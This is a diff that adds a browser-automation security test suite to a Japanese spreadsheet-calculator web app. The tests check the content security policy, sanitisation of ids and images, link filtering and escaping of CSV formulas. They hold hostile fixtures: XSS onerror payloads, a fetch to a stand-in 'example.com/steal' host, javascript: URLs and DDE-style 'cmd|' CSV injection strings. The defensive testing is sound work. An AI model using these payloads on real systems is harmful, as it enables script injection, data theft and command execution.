@@ -6622,6 +6622,77 @@ async function runHelpSplit(browser) {
   await ctx.close();
 }
 
+/* 🔒 セキュリティ（v526）：仕込みのあるデータを読んでもプログラムが動かない・CSP・リンク・CSV */
+async function runSecurity(browser) {
+  const { ctx, page, errs } = await newPage(browser);
+  console.log('\n── 🔒 セキュリティ（v526） ──');
+  const csp = async (p) => p.evaluate(() => { const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]'); return m ? m.content : ''; });
+  const dir = (c, k) => ((c.split(';').map(x => x.trim()).find(x => x.startsWith(k + ' ')) || '').slice(k.length + 1));
+  const c0 = await csp(page);
+  check('  CSP：表電卓は自分の所からだけ読み込む・外へ送らない', [dir(c0, 'default-src'), dir(c0, 'connect-src'), dir(c0, 'object-src'), dir(c0, 'base-uri'), dir(c0, 'script-src')].join(' | '), "'self' | 'self' data: blob: | 'none' | 'self' | 'self' 'unsafe-inline'");
+  for (const [sub, strict] of [['kaikei', false], ['koe', false], ['eigo', false], ['notes', true], ['saien', true]]) {
+    const sp = await ctx.newPage(); await sp.goto('file://' + path.join(ROOT, sub, 'index.html')); await sp.waitForTimeout(300);
+    const c = await csp(sp);
+    check('  CSP：' + sub + (strict ? '（ページの中のプログラムも動かさない）' : ''), [/object-src 'none'/.test(c), dir(c, 'script-src')].join(' | '), 'true | ' + (strict ? "'self'" : "'self' 'unsafe-inline'"));
+    if (strict) {
+      await sp.evaluate(() => document.body.insertAdjacentHTML('beforeend', '<img id="xssT" src="x" onerror="window.__pwn=1">')); await sp.waitForTimeout(300);
+      check('  ' + sub + '：画面に入りこんだ onerror は動かない', await sp.evaluate(() => window.__pwn || 0), 0);
+    }
+    await sp.close();
+  }
+  // 外のサイトのプログラムは読み込まない・外へは送れない
+  const ext = await page.evaluate(() => new Promise(res => {
+    let v = 0; document.addEventListener('securitypolicyviolation', e => { v++; }, { once: false });
+    const sc = document.createElement('script'); sc.src = 'https://example.com/evil.js'; document.head.appendChild(sc);
+    fetch('https://example.com/steal?d=1').then(() => 'sent', () => 'blocked').then(f => setTimeout(() => res(f + '/' + (v >= 2)), 300));
+  }));
+  check('  外のサイトのプログラムは読み込まず、外へも送らない', ext, 'blocked/true');
+
+  // 仕込みのある道具のデータ（読み込んだファイルの id に " や < が入っている）
+  const BAD = 'x"><img src=x onerror=window.__pwn=2>';
+  const BADIMG = 'data:image/png;base64,AAAA"><img src=x onerror=window.__pwn=3>';
+  const seeds = {
+    heya: ['excalc_heya', { v: 1, rooms: [{ id: BAD, name: '松の間', cap: 6, note: '' }], bookings: [{ id: BAD, room: BAD, in: '2026-10-07', nights: 2, name: '山田様', adult: 2, child: 0, infant: 0, meal: '2食', status: 'ok' }], ui: { start: '2026-10-06', days: 14 } }, () => { const hy = hyState(); return hy.rooms[0].id + ' ' + hy.bookings[0].id + ' ' + (hy.bookings[0].room === hy.rooms[0].id); }],
+    shimai: ['excalc_shimai', { v: 1, view: 'new', items: [{ id: BAD, name: 'パスポート', place: '金庫', note: '', added: '2026-10-07', updated: '2026-10-07', ts: 1, hist: [] }] }, () => smState().items[0].id],
+    annai: ['excalc_annai', { v: 1, name: '宿', sections: [{ id: BAD, icon: '♨', title: 'お風呂', season: 'all', body: 'あり', open: false }] }, () => anState().sections[0].id],
+    subsc: ['excalc_subsc', { v: 2, items: [{ id: BAD, name: '動画', price: 990, cycle: 'm', next: '', pay: '', cat: '', uid: '', url: '', memo: '', stop: false, upd: 0, sec: null }] }, () => [...document.querySelectorAll('#sbBody [data-id]')].map(e => e.dataset.id).join(' ')],
+    kakeizu: ['excalc_kakeizu', { people: [{ id: BAD, name: '山田 太郎', sex: 'm', f: BAD, m: '', sp: [BAD], photo: BADIMG }, { id: 'p2', name: '山田 花子', sex: 'f', sp: [BAD] }], me: BAD, focus: BAD, up: 3, down: 2 }, () => { const kz = kzState(); return kz.people.map(p => p.id + ':' + p.sp.join('+') + ':' + (p.photo ? 'photo' : '')).join(' ') + ' me=' + kz.me; }],
+    regi: ['excalc_regi', { ev: { name: '祭り', date: '' }, items: [{ id: BAD, name: 'クッキー', price: 300, stock0: 20, stock: 9, photo: BADIMG }], sales: [{ id: BAD, no: BAD, t: 1, lines: [{ id: BAD, name: 'クッキー', price: 300, qty: 2 }], total: BAD, paid: 1000, change: 400, fixOf: BAD }], no: 2 }, () => { const rg = rgState().rg; return rg.items[0].id + ' ' + (rg.items[0].photo ? 'photo' : '') + ' ' + rg.sales[0].id + ' no=' + rg.sales[0].no + ' fix=' + rg.sales[0].fixOf + ' line=' + rg.sales[0].lines[0].id; }],
+    meishi: ['excalc_meishi', { v: 1, view: 'new', items: [{ id: BAD, name: '鈴木 花子', company: '工務店', tags: [], added: '2026-10-07', updated: '2026-10-07', ts: 1 }] }, () => mcState().items[0].id],
+  };
+  for (const [tool, [key, val, got]] of Object.entries(seeds)) {
+    await page.evaluate(([k, v]) => { localStorage.setItem(k, JSON.stringify(v)); window.__pwn = 0; }, [key, val]);
+    await page.evaluate(t => NP_TOOLS.find(x => x.id === t).run(), tool); await page.waitForTimeout(700);
+    if (tool === 'regi') { await page.evaluate(() => { if (typeof rgOpenHist === 'function') rgOpenHist(); }); await page.waitForTimeout(300); }
+    const r = await page.evaluate(g => { let ids = ''; try { ids = (0, eval)('(' + g + ')')(); } catch (e) { ids = 'err:' + e.message; } return { pwn: window.__pwn || 0, img: document.querySelectorAll('img[onerror]').length, ids }; }, got.toString());
+    check('  ' + tool + '：仕込みのある id・写真を読んでも何も動かない', r.pwn + '/' + r.img + '/' + /["<>]|^err/.test(r.ids), '0/0/false');
+    if (tool === 'regi') check('  regi：会計の記録の No. は数にする・写真でないものは入れない', /no=1 fix=0 /.test(r.ids) + ' ' + / photo /.test(r.ids), 'true false');
+    if (tool === 'heya') check('  heya：おかしな id は作り直す（その部屋につながっていた予約は「部屋なし」に）', /^h\w+ h\w+ false$/.test(r.ids), true);
+    await page.evaluate(() => { document.querySelectorAll('.modal-overlay').forEach(o => { if (typeof isDlgOpen === 'function' && o.id && isDlgOpen(o.id)) try { closeDlg(o.id); } catch (_) {} }); });
+    await page.keyboard.press('Escape'); await page.waitForTimeout(200);
+  }
+  await page.evaluate(() => { ['excalc_heya', 'excalc_shimai', 'excalc_annai', 'excalc_subsc', 'excalc_kakeizu', 'excalc_regi', 'excalc_meishi'].forEach(k => localStorage.removeItem(k)); });
+  check('  safeId：英数字と - _ だけ通す（ほかは作り直す・なければ空）', await page.evaluate(() => [safeId('ab_C-9'), safeId(12), safeId('a"b'), safeId('a b', () => 'new'), safeId(null), safeId('x'.repeat(81))].join(',')), 'ab_C-9,12,,new,,');
+  check('  safeImg：写真の形のものだけ', await page.evaluate(() => [safeImg('data:image/jpeg;base64,/9j/4AAQ+=='), safeImg('data:image/png;base64,AA"><b>'), safeImg('javascript:alert(1)'), safeImg('data:image/svg+xml;base64,AAAA')].map(x => x ? 'ok' : 'no').join(',')), 'ok,no,no,no');
+
+  // リンク：javascript: などは開かない
+  check('  isSafeLinkUrl：javascript: / data: / vbscript: は開かない（空白・大文字でごまかしても）', await page.evaluate(() => ['https://example.com', 'tel:0120', 'mailto:a@b.jp', '/x', 'javascript:alert(1)', ' JaVa\tScRiPt:alert(1)', 'data:text/html,<b>', 'vbscript:x'].map(u => isSafeLinkUrl(u) ? 'o' : 'x').join('')), 'ooooxxxx');
+  await page.evaluate(() => { window.__pwn = 0; window.__opened = []; window.__wo = window.open; window.open = (u) => { window.__opened.push(u); return {}; }; openRegLink('javascript:window.__pwn=4'); openRegLink('example.com'); window.open = window.__wo; });
+  check('  登録したリンク：javascript: は開かず、ふつうのアドレスは開く', await page.evaluate(() => window.__pwn + '/' + window.__opened.join(',') + '/' + location.protocol), '0/https://example.com/file:');
+
+  // CSV：= + - @ で始まる文字は式にしない
+  check('  csvSafe：= + - @ で始まる文字の頭に \'（数字・電話番号・日付はそのまま）', await page.evaluate(() => ['=1+1', '@SUM(A1)', '+cmd|x', '-2+3+cmd|x', '\t=1', '-5', '-1,234.5', '+81 90-1234-5678', '2026/10/07', '(03)1234', '', 'ふつう'].map(csvSafe).join(' ')), "'=1+1 '@SUM(A1) '+cmd|x '-2+3+cmd|x '\t=1 -5 -1,234.5 +81 90-1234-5678 2026/10/07 (03)1234  ふつう");
+  await page.evaluate(() => { setCellVal(0, 0, '@SUM(1+1)*cmd'); setCellVal(0, 1, '-100'); setCellVal(0, 2, '=1+2'); });
+  const [dl] = await Promise.all([page.waitForEvent('download'), page.evaluate(() => exportCSV())]);
+  const csvText = fs.readFileSync(await dl.path(), 'utf8').replace(/^﻿/, '').split(/\r?\n/)[0].split(',').slice(0, 3).join(',');
+  check('  表のCSV：文字の @… には \' が付き、数・式の答えはそのまま', csvText, "'@SUM(1+1)*cmd,-100,3");
+  check('  保存した表の CSV：表電卓の関数だけの式は式のまま、ほかは文字に', await page.evaluate(() => ['=SUM(A1:A3)', '=AVG(B1,2)*3', '=ROUND(A1,0)&"cmd|x"', "=cmd|' /C calc'!A0", '=HYPERLINK("http://x","y")', '=WEBSERVICE("http://x")', '=sum(a1)'].map(f => csvFormulaOk(f) ? 'o' : 'x').join('')), 'ooxxxxo');
+  const kp = await ctx.newPage(); await kp.goto(KAIKEI); await kp.waitForTimeout(400);
+  check('  会計アプリの CSV も同じ', await kp.evaluate(() => [csvCell('=HYPERLINK("x")'), csvCell('-500'), csvCell('ふつう')].join(' ')), "\"'=HYPERLINK(\"\"x\"\")\" -500 ふつう");
+  await kp.close();
+  check('  エラーなし', errs.join(' | '), '');
+  await ctx.close();
+}
 async function runBackKey(browser) {
   console.log('\n── スマホの「戻る」（v402） ──');
   const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true });
@@ -10312,6 +10383,7 @@ async function runQrShare(browser) {
     if (!only || only === 'brush3') await runBrush3(browser);
     if (!only || only === 'help') await runHelpSplit(browser);
     if (!only || only === 'backkey') await runBackKey(browser);
+    if (!only || only === 'security') await runSecurity(browser);
     // 見た目の見比べは最後に（見本は tests/visual/base/。撮り直しは node tests/visual.js --update）
     if (!only || only === 'visual') await require('./visual').runVisual(browser, check);
   } finally { await browser.close(); }
